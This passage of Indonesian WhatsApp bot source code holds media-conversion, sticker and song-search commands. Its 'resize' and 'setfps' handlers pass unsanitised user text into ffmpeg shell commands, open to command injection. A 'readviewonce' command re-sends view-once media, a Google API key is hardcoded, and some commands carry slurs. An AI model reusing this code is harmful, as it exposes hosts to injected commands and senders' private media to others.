Aira.sendMessage(m.chat, { image: { url: `https://skizo.tech/api/removebg?url=${anu}&apikey=${setting.XznKey}` }, caption: 'Done Ayangg >///<'}, { quoted: m})
}
limitAdd(m.sender, limit)
break
case 'resize': {
if (!q) return newReply(`Masukan ukuran panjangxlebar, contoh ${prefix+command} 300x300`)
if (/image/.test(mime)){
newReply(mess.wait) 
let panjang = q.split('x')[0] 
let lebar = q.split('x')[1] 
let media = await Aira.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.jpeg')
exec(`ffmpeg -i ${media} -vf scale=${panjang}:${lebar} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return newReply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
await Aira.sendMessage(m.chat, {mimetype: 'image/jpeg', image: buffer453, caption: `Done Ayang>///<`}, { quoted: fkontak })
fs.unlinkSync(ran)
})}
if (/video/.test(mime)){
newReply(mess.wait) 
let panjang2 = q.split('x')[0] 
let lebar2 = q.split('x')[1] 
let media2 = await Aira.downloadAndSaveMediaMessage(quoted)
let ran2 = getRandom('.mp4')
exec(`ffmpeg -i ${media2} -vf scale=${panjang2}:${lebar2} ${ran2}`, async (err) => {
fs.unlinkSync(media2)
if (err) return newReply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran2)
await Aira.sendMessage(m.chat, {mimetype: 'video/mp4', video: buffer453, caption: `Done Ayang>///<`}, { quoted: fkontak })
fs.unlinkSync(ran2)
})
}}
limitAdd(m.sender, limit)
break

case 'setfps': {
if (!q) return newReply(`Masukan Fps, contoh ${prefix+command} 30`)
if (!/video/.test(mime)) return newReply(`Hanya Untuk Video`)
newReply(mess.wait)
let fps = q
let media2 = await Aira.downloadAndSaveMediaMessage(quoted)
let ran2 = getRandom('.mp4')
exec(`ffmpeg -i ${media2} -r ${fps} ${ran2}`, async (err) => {
fs.unlinkSync(media2)
if (err) return newReply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran2)
await Aira.sendMessage(m.chat, {mimetype: 'video/mp4', video: buffer453, caption: `Done Ayang>///<`}, { quoted: fkontak })
fs.unlinkSync(ran2)
})

}
break
case 'postig': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
newReply(mess.wait)
const media = await Aira.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
Aira.sendMessage(m.chat, { image: { url: `https://api.zeeoneofc.my.id/api/image-effect/instagram2?apikey=${setting.BotKey}&url=${anu}` }, caption: 'Cie Fotonya Dipost Bot'}, { quoted: m})
}
limitAdd(m.sender, limit)
break
case 'gay': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
newReply(mess.wait)
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
newReply(mess.wait)
const media = await Aira.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
Aira.sendMessage(m.chat, { image: { url: `https://api.zeeoneofc.my.id/api/image-effect/${command}?apikey=${setting.BotKey}&url=${anu}` }, caption: 'Awas Ada Gay😱'}, { quoted: m})
}
limitAdd(m.sender, limit)
break
case 'brazzers': case 'triggered': case 'jail': case 'rip': case 'wanted': case 'fire': case 'beautiful':  case 'wasted':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
newReply(mess.wait)
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
newReply(mess.wait)
const media = await Aira.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
Aira.sendMessage(m.chat, { image: { url: `https://api.zeeoneofc.my.id/api/image-effect/${command}?apikey=${setting.BotKey}&url=${anu}` }, caption: 'Done Ayang >///<'}, { quoted: m})
}
limitAdd(m.sender, limit)
break

 case 'baruu': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
newReply(mess.wait)
try {
let media = await quoted.download()
let anu = await TelegraPh(media)
let hasil = await processing(anu, "enhance");
Aira.sendFile(m.chat, hasil, 'anu.jpg', `Prompt: enhance`, m)
     } catch (e) {
newReply(e)
}
}
limitAdd(m.sender, limit)
break

case 'remini': case 'hd': case 'hdr': {
  // Cek limit
  if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)

  // Cek format media
  if (!quoted) return newReply(`Fotonya Mana?`)
  let tingkat= text?text:2;
  if (tingkat!=2&&tingkat!=4) return newReply('pilihan tingkat penjernihan hanya 2 dan 4')
  if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command} tingkat\ncontoh:\n${prefix + command} 4`)

  // Cek cooldown
  let lastRemini = global.db.data.users[m.sender].lastRemini
  if (new Date().getTime() - lastRemini < 45 * 1000) {
    let remainingTime = Math.floor((45 * 1000 - (new Date().getTime() - lastRemini)) / 1000)
    return newReply(`Cooldown masih aktif, tunggu ${remainingTime} detik untuk menggunakan kembali fitur ini.`)
  }

  // Proses remini
 // Update lastRemini
  //global.db.data.users[m.sender].lastRemini = new Date().getTime()
  newReply(mess.wait)
  let media = await quoted.download()
  try{
  mem = await TelegraPh(media)}
  catch(err){
  return newReply('Gagal memproses coba gunakan .hd2')
  }
  let image = await fetchJson(`https://widipe.com/remini?url=${mem}&resolusi=${tingkat}`)
if (!image.status) {
return newReply('Gagal memproses coba gunakan .hd2')
}
else {
  Aira.sendMessage(m.chat, { image: { url: image.url}, caption: 'Apabila Hasil Kurang Bagus Gunakan Perintah *.hd 4* Untuk Hasil Yang Lebih Baik'}, { quoted: m})
}
  // Tambah limit
  limitAdd(m.sender, limit)
}
break

case 'cekdb':{
newReply(JSON.stringify(global.db.data.users[m.sender]))
}
break

case 'remini2': case 'hd2': case 'hdr2':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
  newReply(mess.wait)
  let media = await quoted.download()
  let proses = await remini(media, "enhance");
  Aira.sendMessage(m.chat, { image: proses, caption: 'Apabila Hasil Kurang Bagus Silahkan Ulangi'}, { quoted: m})
limitAdd(m.sender, limit)
}
break
case 'remini3': case 'hd3': case 'hdr3': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
newReply(mess.wait)

let media = await quoted.download()
let proses = await remini(media, "enhance");
let simpan = await savefrombuffer(proses,'.png')
let gambarr = await jimp.read (simpan)
await gambarr.color([
{ apply: 'saturate', params: [text?text:13] }]);
//await gambarr.contrast(0.1 * contrast)
await gambarr.writeAsync('new.png')
Aira.sendMessage(m.chat, { image: fs.readFileSync('new.png'), caption: 'Apabila Hasil Kurang Bagus Silahkan Ulangi'}, { quoted: m})
fs.unlinkSync('new.png')
}
limitAdd(m.sender, limit)
break



// Converter & Tools Menu
case 'patrick': case 'popoci': case 'sponsbob': case 'kawan-sponsbob': case 'awoawo': case 'chat': case 'dbfly': case 'dino-kuning': case 'doge': case 'gojosatoru': case 'hope-boy': case 'jisoo': case 'kr-robot': case 'kucing': case 'manusia-lidi': case 'menjamet': case 'meow': case 'nicholas': case 'tyni':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let dino = `https://api.zeeoneofc.my.id/api/telegram-sticker/${command}?apikey=${setting.BotKey}`
Aira.sendStickerFromUrl(m.chat, dino, m, {packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })
limitAdd(m.sender, limit)
break

case 'qc': {
//return newReply('Fitur sedang error')
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply ('Masukkan Teks') 
const { quote } = require('./lib/quote.js')
if (!q) return ('Masukan Text')
let ppnyauser = await Aira.profilePictureUrl(m.sender, 'image').catch(_=> 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
const rest = await quote(q, pushname, ppnyauser)
Aira.imgToSticker(m.chat, rest.result, m, {packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })
}limitAdd(m.sender, limit)
break

case 'qc2':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply ('Masukkan Teks') 
let qc = `https://skizo.tech/api/qc?text=${text}&username=${pushname}&avatar=https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSsA4yNn3pILbEZv5_QAf0hV-hA_E38lNNa0w&usqp=CAU&apikey=${setting.XznKey}`
Aira.sendMessage(m.chat, { image: { url: qc}, caption: `Done`}, {quoted: m})
limitAdd(m.sender, limit)}
break
case 'lonte': {
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
let lonte = `https://api.zeeoneofc.my.id/api/telegram-sticker/${command}?apikey=${setting.BotKey}`
Aira.sendStickerFromUrl(m.chat, lonte, m, {packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })
limitAdd(m.sender, limit)}
break
case 'stiker': case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
addCountCmd('#sticker', m.sender, _cmd)
if (!quoted) return newReply(`Balas Video/Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
newReply(mess.wait)
let media = await Aira.downloadAndSaveMediaMessage(quoted, + new Date * 1)
await Aira.imgToSticker(m.chat, media, m, { packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })
await fs.unlinkSync(media)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return newReply('Maksimal 10 detik!')
newReply(mess.wait)
let media = await Aira.downloadAndSaveMediaMessage(quoted, + new Date * 1)
await Aira.sendStickerFromUrl(m.chat, media, m, { packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })
//await Aira.vidToSticker(m.chat, media, m, { packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })
//await fs.unlinkSync(media)
}else newReply(`Balas Video/Image Dengan Caption ${prefix + command}`)
}
limitAdd(m.sender, limit)
break

case 'colong': case 'curi': {
if (!isCreator) return newReply('malas')
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
newReply(mess.wait)
if (/image/.test(mime)) {
let media = await quoted.download()
await Aira.sendStickerFromUrl(m.chat, media, m, { packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })

} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return newReply('Maksimal 10 detik!')
let { webp2mp4File } = require('./lib/uploader')
let media = await quoted.download()
let webpToMp4 = await webp2mp4File(media)
await Aira.sendStickerFromUrl(m.chat, webp4ToMp4, m, {packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })
//newReply("Makasih Stikernya Orang Baik")
}
}
limitAdd(m.sender, limit)
break

case 'stickerwm': case 'swm': case 'stickergifwm': case 'sgifwm': case 'wm': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!quoted) return newReply(`Balas Video/Image Dengan Caption ${prefix + command} teks1|teks2`)
addCountCmd('#stickerwm', m.sender, _cmd)
let [teks1, teks2] = text.split`|`
if (!teks1) return newReply(`Balas Video/Image Dengan Caption ${prefix + command} teks1|teks2`)
if (!teks2) return newReply(`Balas Video/Image Dengan Caption ${prefix + command} teks1|teks2`)
newReply(mess.wait)
if (/image/.test(mime)) {
let media = await quoted.download()
Aira.sendStickerFromUrl(m.chat, media, m, {packname: `${teks1}\n${tanggal(new Date())}`, author: `${teks2}\nTime ${time}`})
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return newReply('Maksimal 10 detik!')
let { webp2mp4File } = require('./lib/uploader')
let media = await quoted.download()
let webpToMp4 = await webp2mp4File(media)
Aira.sendStickerFromUrl(m.chat, webpToMp4, m, {packname: `${teks1}\n${tanggal(new Date())}`, author: `${teks2}\nTime ${time}`})
} else {
newReply(`Balas Video/Image Dengan Caption ${prefix + command} teks1|teks2`)
}
}
limitAdd(m.sender, limit)
break
case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
addCountCmd('#smeme', m.sender, _cmd)
 if (!/webp/.test(mime) && /image/.test(mime)) {
newReply(mess.wait)
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await Aira.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
await Aira.sendStickerFromUrl(m.chat, smeme, m, { packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })
} else {
newReply(`Kirim/reply image dengan caption ${prefix + command} text1|text2`)
}
}
limitAdd(m.sender, limit)
break 

case 'togif': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!/webp/.test(mime)) return newReply(`Reply stiker dengan caption *${prefix + command}*`)
const { webp2mp4 } = require( './lib/webp2mp4.js')
let { webp2mp4File } = require('./lib/uploader')
let media = await Aira.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await Aira.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
await fs.unlinkSync(media)
}
break

case 'tomp4': case 'tovideo': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!/webp/.test(mime)) return newReply(`Reply stiker dengan caption *${prefix + command}*`)
let { webp2mp4File } = require('./lib/uploader')
let media = await Aira.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await Aira.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }}, { quoted: m })
await fs.unlinkSync(media)
}
break
  

case 'tourl':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!quoted) return newReply('Reply Image')
newReply('Proses') 
let media = await Aira.downloadAndSaveMediaMessage(quoted);
if (/image/.test(mime)) {
let anu = await TelegraPh(media);
newReply(util.format(anu));
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media);
newReply(util.format(anu.url));
}
await fs.unlinkSync(media);
}
break;

/*case 'toqr':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text&&!quoted) return newReply(`Kirim perintah:\n${prefix+command} query\n\nContoh penggunaan:\n${prefix+command} Ryudev.biz.id\n note: Maksimal 2048 karakter`)
newReply (mess.wait)
let teks = m.quoted ? quoted.text : text
let qrr = await getBuffer(`https://api.akuari.my.id/other/qrcode?text=${teks}`)
Aira.sendMessage(m.chat, {  image: qrr, caption: `*Kode qr untuk*: ${teks}`}, { quoted: m })
}
limitAdd(m.sender,limit)
break*/
case 'linkshort': case 'shortlink': case 'sl':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!args[0]) return m.reply('Linknya mana?')
if (!args[0].startsWith('https://')) throw 'Masukan Url Dengan Awalan *https://*'
newReply(mess.wait)
let anu = await fetch(`https://api.akuari.my.id/short/tinyurl?link=${text}`)
let data = await anu.json()
Aira.sendMessage(m.chat, { text: data.hasil }, {quoted:m })
}
limitAdd(m.sender,limit)
break
case 'save':{
if (!isCreator) return newReply(`Khusus Owner`)
if(!text) return newReply('masukkan nama file')
if (!quoted) return newReply(`Medianya Mana?`)
newReply('Downloading')
let downloads = await Aira.downloadAndSaveMediaMessage(quoted,text);
newReply('Sukses Disimpan Dengan Nama: '+downloads)
}
break
case 'toimage': case 'toimg': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
addCountCmd('#toimage', m.sender, _cmd)
if (!quoted) return newReply('Reply Image')
if (!/webp/.test(mime)) return newReply (`Balas sticker dengan caption *${prefix + command}*`)
newReply(mess.wait)
let media = await Aira.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
Aira.sendMessage(m.chat, { image: buffer }, { quoted: m })
fs.unlinkSync(ran)
})
}
limitAdd(m.sender, limit)
break
case 'readvo': case 'readviewonce': {
if (!m.quoted) throw 'Reply gambar/video yang ingin Anda lihat'
  if (m.quoted.mtype !== 'viewOnceMessageV2') throw 'Ini bukan pesan view-once.'
  let msg = m.quoted.message
  let type = Object.keys(msg)[0]
  let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
  let buffer = Buffer.from([])
  for await (const chunk of media) {
    buffer = Buffer.concat([buffer, chunk])
  }
  if (/video/.test(type)) {
    return Aira.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
  } else if (/image/.test(type)) {
    return Aira.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
  }
}
break

case 'readvovn':{
if (!m.quoted) throw 'Reply gambar/video yang ingin Anda lihat'
  if (m.quoted.mtype !== 'viewOnceMessageV2Extension') throw 'Ini bukan pesan view-once-voicenote.'
  let msg = m.quoted.message
  let type = Object.keys(msg)[0]
  console.log(type)
 /* let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
  let buffer = Buffer.from([])
  for await (const chunk of media) {
    buffer = Buffer.concat([buffer, chunk])
  }
  if (/video/.test(type)) {
    return Aira.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
  } else if (/image/.test(type)) {
    return Aira.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
  }*/
}
break

case 'toptv':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { toPTT } = require('./lib/converter')
const { MessageType } = require('@adiwajshing/baileys')
  let q = m.quoted ? m.quoted : m
  if (!/video|audio/.test(mime)) throw `Balas video atau voice note yang ingin diubah ke mp3 dengan caption *${prefix + command}*`
  let media = await q.download()
let dataVideo = { ptvMessage: m.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage }
Aira.relayMessage(m.chat, dataVideo, {})
}
limitAdd(m.sender, limit) 
break
case 'tovn': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
addCountCmd('#tovn', m.sender, _cmd)
 if (!/video/.test(mime) && !/audio/.test(mime)) return newReply (`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
if (!quoted) return newReply (`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
newReply(mess.wait)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
Aira.sendMessage(m.chat, {audio, mimetype:'audio/mpeg', ptt: true}, { quoted : m })
}
limitAdd(m.sender, limit)
break
case 'shazam':case 'judullagu': case 'cekjudul': case 'carijudullagu': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!/video/.test(mime) && !/audio/.test(mime)) return newReply (`Reply Video/Vn senandungkan lagu/audio Yang Ingin Dicari Judul Lagunya ${prefix + command}`)
newReply(mess.wait)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
//console.log(audio)
let ran2 = getRandom('.mp3')
fs.writeFileSync(ran2, Buffer.from(audio))
let link = await UploadFileUgu(ran2)
console.log(link)
let response = await rapid.shazam(link.url)
let Judul = `lagu ${response.result && response.result.track && response.result.track.title? response.result.track.title : 'Could not be determined'}`
console.log(Judul);
if(Judul == 'lagu Could not be determined') return m.reply('Mohon Maaf Saya Tidak Dapat Menemukan Judul Lagu Yang Sesuai Dengan Sample Suara Yang Diberikan')

let search = await yts(`${Judul}`)
let caption = `*HASIL PENCOCOKAN LAGU*

あ ID : ${search.all[0].videoId}
あ Judul Lagu : ${search.all[0].title}
あ Views : ${search.all[0].views}
あ Duration : ${search.all[0].timestamp}
あ Channel : ${search.all[0].author.name}
あ Upload : ${search.all[0].ago}
あ URL Video : ${search.videos[0].url}
あ Description : ${search.videos[0].description}

_Please Wait The Audio File Is Being Send..._`
let todd = await getBuffer(search.all[0].image)
let ply = search.videos[0].url
let mp4file = `./${m.chat}.mp4`
const ytdl = require('ytdl-core')
let nana2 = await ytdl(ply, { filter: 'videoandaudio' })
  .pipe(fs.createWriteStream(mp4file))
  .on('finish', async () => {
 Aira.sendMessage(m.chat, {video: fs.readFileSync(mp4file), mimetype:'video/mp4' , caption: caption}, {quoted: m})
   })
//Aira.sendMessage(m.chat, {image: todd, caption: caption}, {quoted:m})
 let mp3file = `./${m.chat}.mp3`
  let nana = ytdl(ply, { filter: 'audioonly' })
  .pipe(fs.createWriteStream(mp3file))
  .on('finish', async () => {
   await delay(1500)
    Aira.sendMessage(m.chat, {audio: fs.readFileSync(mp3file), mimetype:'audio/mpeg', ptt:true }, {quoted: m})
await Aira.sendMessage(m.chat, { document: fs.readFileSync(mp3file), fileName: Judul+'.mp3', mimetype: 'audio/mp3' }, { quoted: m })
   })




}
limitAdd(m.sender, limit)
break

case 'whatmusic': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!/video/.test(mime) && !/audio/.test(mime)) return newReply (`Reply Video/Vn senandungkan lagu/audio Yang Ingin Dicari Judul Lagunya ${prefix + command}`)
newReply(mess.wait)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
//console.log(audio)
let ran2 = getRandom('.mp3')
fs.writeFileSync(ran2, Buffer.from(audio))
let link = await UploadFileUgu(ran2)
console.log(link)
let response = await fetchJson(`https://widipe.com/whatmusic?url=${link}`)
const lines = response.result.split('\n');
let title = '';
let artist = '';
let duration = '';
let release = '';
let genre = '';
let score = '';
let source = '';
lines.forEach(line => {
  const [key, value] = line.split(': ');

  switch (key) {
    case 'Title':
      title = value;
      break;
    case 'Artists':
      artist = value;
      break;
    case 'Duration':
      duration = value;
      break;
    case 'Release':
      release = value;
      break;
    case 'Genre':
      genre = value;
      break;
    case 'Score':
      score = value;
      break;
    case 'Source':
      source = value;
      break;
  }
});
artist = artist === 'undefined' ? '' : artist;
let Judul = `lagu ${title}-${artist}`
console.log(Judul);
if(Judul == 'lagu undefined-') return m.reply('Mohon Maaf Saya Tidak Dapat Menemukan Judul Lagu Yang Sesuai Dengan Sample Suara Yang Diberikan')

let search = await yts(`${Judul}`)
let caption = `*HASIL PENCOCOKAN LAGU*

あ ID : ${search.all[0].videoId}
あ Judul Lagu : ${search.all[0].title}
あ Views : ${search.all[0].views}
あ Duration : ${search.all[0].timestamp}
あ Channel : ${search.all[0].author.name}
あ Upload : ${search.all[0].ago}
あ URL Video : ${search.videos[0].url}
あ Description : ${search.videos[0].description}

_Please Wait The Audio File Is Being Send..._`
let todd = await getBuffer(search.all[0].image)
let ply = search.videos[0].url
let mp4file = `./${m.chat}.mp4`
const ytdl = require('ytdl-core')
let nana2 = await ytdl(ply, { filter: 'videoandaudio' })
  .pipe(fs.createWriteStream(mp4file))
  .on('finish', async () => {
 Aira.sendMessage(m.chat, {video: fs.readFileSync(mp4file), mimetype:'video/mp4' , caption: caption}, {quoted: m})
   })
//Aira.sendMessage(m.chat, {image: todd, caption: caption}, {quoted:m})
 let mp3file = `./${m.chat}.mp3`
  let nana = ytdl(ply, { filter: 'audioonly' })
  .pipe(fs.createWriteStream(mp3file))
  .on('finish', async () => {
   await delay(1500)
    Aira.sendMessage(m.chat, {audio: fs.readFileSync(mp3file), mimetype:'audio/mpeg', ptt:true }, {quoted: m})
await Aira.sendMessage(m.chat, { document: fs.readFileSync(mp3file), fileName: Judul+'.mp3', mimetype: 'audio/mp3' }, { quoted: m })
   })




}
limitAdd(m.sender, limit)
break
case 'toaudio': case 'tomp3':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
addCountCmd('#tomp3', m.sender, _cmd)
 if (!/video/.test(mime) && !/audio/.test(mime)) return newReply (`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
if (!quoted) return newReply (`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
newReply(mess.wait)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
Aira.sendMessage(m.chat, {audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
limitAdd(m.sender, limit)
break
case "ttp": case 'attp':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
addCountCmd('#attp', m.sender, _cmd)
if (!text) return newReply(`Example : ${prefix + command} halo`)
if(text.length > 20) return newReply("Maksimal 20 karakter")
newReply(mess.wait)
await Aira.sendStickerFromUrl(m.chat, `https://api.zeeoneofc.my.id/api/canvas/${command}?text=${q}&apikey=${setting.BotKey}`, m, { packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })
}
limitAdd(m.sender, limit)
break
case 'emojimix': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
addCountCmd('#emojimix', m.sender, _cmd)
let [emoji1, emoji2] = text.split`+`
if (!emoji1) return newReply(`Example : ${prefix + command} 😅+💩`)
if (!emoji2) return newReply(`Example : ${prefix + command} 😅+💩`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await Aira.sendStickerFromUrl(m.chat, res.url, m, { packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}`, categories: res.tags })
}
}
limitAdd(m.sender, limit)
break
case 'nulis':{
addCountCmd('#nulis', m.sender, _cmd)
newReply(`*Pilihan Fitur Nulis*
1. ${prefix}nuliskiri
2. ${prefix}nuliskanan
3. ${prefix}foliokiri
4. ${prefix}foliokanan

Contoh:
${prefix}nuliskiri Aira Selebew`)}
break
case 'nuliskiri': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} Aira`)
newReply(mess.wait)
const tulisan = body.slice(11)
addCountCmd('#nuliskiri', m.sender, _cmd)
Aira.sendMessage(m.chat, {image:{url:`https:\/\/api.zeeoneofc.my.id/api/canvas/${command}?text=${q}&apikey=${setting.BotKey}`}, caption: "Nih kak"}, {quoted: m}).catch(async _ => await newReply("apikey sedang eror"))
limitAdd(m.sender, limit)
}
limitAdd(m.sender, limit)
break
case 'nuliskanan': {
